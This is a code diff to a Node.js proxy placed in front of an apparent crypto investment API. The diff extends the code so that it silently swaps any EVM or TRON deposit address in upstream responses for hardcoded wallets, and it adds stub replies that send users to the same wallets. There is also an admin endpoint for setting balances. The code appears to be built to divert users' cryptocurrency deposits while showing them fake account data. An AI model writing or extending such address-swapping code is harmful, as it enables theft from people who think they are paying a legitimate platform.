@@ -11,7 +11,8 @@
  *   POSTGRES_URL       — auto-set when you add Vercel Postgres
  *   STUB_ADMIN_SECRET  — POST /api/admin/balance with header x-admin-secret
  *   UPSTREAM_API       — upstream API base (default: https://api.aramcoinvest.net)
- *   DEPOSIT_EVM_ADDRESS — optional override; default is the platform EVM (ETH / Polygon USDT-style) deposit wallet
+ *   DEPOSIT_EVM_ADDRESS  — optional override for EVM (0x…) deposit wallet
+ *   DEPOSIT_TRON_ADDRESS — optional override for TRON (T…) TRC20 deposit wallet
  */
 
 const https = require("https");
@@ -29,30 +30,44 @@ const TELEGRAM_SUPPORT = {
 
 const UPSTREAM = (process.env.UPSTREAM_API || "https://api.aramcoinvest.net").replace(/\/+$/, "");
 
-/** EVM-compatible deposit address (Ethereum, Polygon, BSC, etc.). Patched into recharge API JSON. */
+/** EVM-compatible deposit address (Ethereum, Polygon, BSC, etc.). */
 const DEPOSIT_EVM_ADDRESS = String(
   process.env.DEPOSIT_EVM_ADDRESS || "0xfBCf4f29999126BBeb2B27dcf7428C018E2BE86E"
 ).trim();
 
-const EVM_ADDR_RE = /^0x[a-fA-F0-9]{40}$/;
+/** TRON TRC20 deposit address (base58, 34 chars, starts with T). */
+const DEPOSIT_TRON_ADDRESS = String(
+  process.env.DEPOSIT_TRON_ADDRESS || "THJc5xoL679Ag1JSQMDLWTPq5VhTWTYdJ6"
+).trim();
 
-function patchEvmDepositAddresses(x) {
+const EVM_ADDR_RE = /^0x[a-fA-F0-9]{40}$/;
+/** TRON mainnet address shape (client QR encodes this string). */
+const TRON_ADDR_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
+
+function patchOneDepositString(s) {
+  if (typeof s !== "string") return s;
+  const t = s.trim();
+  if (EVM_ADDR_RE.test(t)) return DEPOSIT_EVM_ADDRESS;
+  if (TRON_ADDR_RE.test(t)) return DEPOSIT_TRON_ADDRESS;
+  return s;
+}
+
+/** Rewrite EVM and TRON-shaped wallet strings in API JSON (nested). */
+function patchDepositAddresses(x) {
   if (x === null || x === undefined) return x;
-  if (typeof x === "string") {
-    return EVM_ADDR_RE.test(x.trim()) ? DEPOSIT_EVM_ADDRESS : x;
-  }
-  if (Array.isArray(x)) return x.map(patchEvmDepositAddresses);
+  if (typeof x === "string") return patchOneDepositString(x);
+  if (Array.isArray(x)) return x.map(patchDepositAddresses);
   if (typeof x === "object") {
     const o = {};
     for (const k of Object.keys(x)) {
-      o[k] = patchEvmDepositAddresses(x[k]);
+      o[k] = patchDepositAddresses(x[k]);
     }
     return o;
   }
   return x;
 }
 
-/** Routes that return crypto deposit addresses — normalize to DEPOSIT_EVM_ADDRESS. */
+/** Routes that return crypto deposit addresses — patched to platform wallets. */
 function isDepositApiRoute(route) {
   return (
     route === "/user/recharge" ||
@@ -277,30 +292,71 @@ function isLocalIssuedToken(req) {
   return Boolean(t && /^tk_/i.test(t));
 }
 
+function parseStubBody(rawBody) {
+  if (!rawBody || !rawBody.length) return {};
+  const s = rawBody.toString();
+  try {
+    return JSON.parse(s);
+  } catch (e) {
+    try {
+      const params = new URLSearchParams(s);
+      const o = {};
+      params.forEach((v, k) => {
+        o[k] = v;
+      });
+      return o;
+    } catch (e2) {
+      return {};
+    }
+  }
+}
+
+function isTronDepositRequest(body) {
+  const o = body || {};
+  const blob = JSON.stringify(o).toLowerCase();
+  if (/trc|tron|trc20/.test(blob)) return true;
+  const t = o.type;
+  if (t === 2 || t === "2" || t === 3 || t === "3") return true;
+  return false;
+}
+
+/** bank_recharge POST body may indicate EVM vs TRON channel (type / keywords). */
+function stubBankRechargeBody(body) {
+  const tron = isTronDepositRequest(body);
+  return {
+    recharge_address: tron ? DEPOSIT_TRON_ADDRESS : DEPOSIT_EVM_ADDRESS,
+    recharge_type: String(body.type != null ? body.type : tron ? 2 : 1),
+    recharge_type_name: tron ? "USDT (TRC20)" : "USDT (ERC20 / Polygon)",
+    recharge_brokerage_account: "false",
+  };
+}
+
 /**
  * When the SPA uses our local login token (tk_*), upstream does not recognize it and returns
  * 410000 / 401 — the client then clears cookies and reloads ("kicked out"). For /user/* routes
  * we substitute safe empty payloads so navigation keeps working.
  */
-function localStubForUserRoute(route, method) {
+function localStubForUserRoute(route, method, rawBody) {
   const m = (method || "GET").toUpperCase();
-  // Deposit / recharge — show unified EVM wallet when upstream rejects local tk_* token
+  // Deposit / recharge — EVM + TRON wallets (QR in app is generated from recharge_address / address)
   if (route === "/user/recharge" && m === "GET") {
     return [
       {
         type: 1,
-        show_name: "USDT (Polygon / ERC20)",
+        show_name: "USDT (ERC20 / Polygon)",
         image: "https://cryptologos.cc/logos/tether-usdt-logo.png",
         address: DEPOSIT_EVM_ADDRESS,
+      },
+      {
+        type: 2,
+        show_name: "USDT (TRC20)",
+        image: "https://cryptologos.cc/logos/tether-usdt-logo.png",
+        address: DEPOSIT_TRON_ADDRESS,
       },
     ];
   }
   if (route === "/user/bank_recharge" && m === "POST") {
-    return {
-      recharge_address: DEPOSIT_EVM_ADDRESS,
-      recharge_type: "1",
-      recharge_type_name: "USDT",
-    };
+    return stubBankRechargeBody(parseStubBody(rawBody));
   }
   if (route === "/user/recharge_send" && m === "POST") return { status: 1 };
   if (route === "/user/submit_recharge" && m === "POST") return {};
@@ -407,11 +463,11 @@ async function proxyToUpstreamUserJson(req, res, route, rawBody, email) {
     }
     const st = parsed.status;
     if (localTk && (st === 410000 || st === 401 || st === 402 || st === 403)) {
-      return json(req, res, 200, ok(localStubForUserRoute(route, req.method)));
+      return json(req, res, 200, ok(localStubForUserRoute(route, req.method, rawBody)));
     }
     let out = parsed;
     if (isDepositApiRoute(route)) {
-      out = patchEvmDepositAddresses(parsed);
+      out = patchDepositAddresses(parsed);
     }
     applyCors(req, res);
     res.setHeader("Content-Type", "application/json; charset=utf-8");
